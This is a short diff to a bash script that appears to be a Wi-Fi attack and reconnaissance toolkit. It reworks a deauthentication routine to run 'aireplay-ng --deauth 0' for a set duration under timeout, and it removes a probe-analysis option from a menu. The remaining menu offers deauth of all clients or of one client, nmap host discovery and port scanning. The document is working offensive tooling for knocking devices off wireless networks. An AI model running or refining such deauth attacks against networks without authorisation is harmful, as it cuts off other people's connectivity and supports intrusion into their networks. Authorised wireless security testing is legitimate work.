@@ -40,12 +40,10 @@ _run_deauth() {
     if (( deauth_duration == 0 )); then
         aireplay-ng --deauth 0 $args "$mon_iface"
     else
-        local end_time=$(( $(date +%s) + deauth_duration ))
         echo -e "${DIM}  Running for ${deauth_duration}s — Ctrl+C to stop early${NC}"
         echo
-        while (( $(date +%s) < end_time )); do
-            aireplay-ng --deauth 10 $args "$mon_iface" &>/dev/null
-        done
+        # Use timeout for precise duration; --deauth 0 means continuous until killed
+        timeout "${deauth_duration}s" aireplay-ng --deauth 0 $args "$mon_iface" &>/dev/null
         echo -e "${BOLD_GREEN}[+]${NC} Done."
     fi
 }
@@ -278,7 +276,6 @@ section "Wireless Recon"
 echo -e "  ${BOLD_CYAN}[1]${NC} Scan Networks"
 echo -e "  ${BOLD_CYAN}[2]${NC} Select Target"
 echo -e "  ${BOLD_CYAN}[3]${NC} Scan Clients"
-echo -e "  ${BOLD_CYAN}[8]${NC} Probe Analysis ${DIM}(requires prior client scan)${NC}"
 echo
 section "Network Recon"
 echo -e "  ${BOLD_CYAN}[4]${NC} Host Discovery ${DIM}(nmap)${NC}"
@@ -301,7 +298,6 @@ case $c in
 5) port_scan ;;
 6) deauth_all ;;
 7) deauth_one ;;
-8) probe_analysis ;;
 9) break ;;
 esac
 
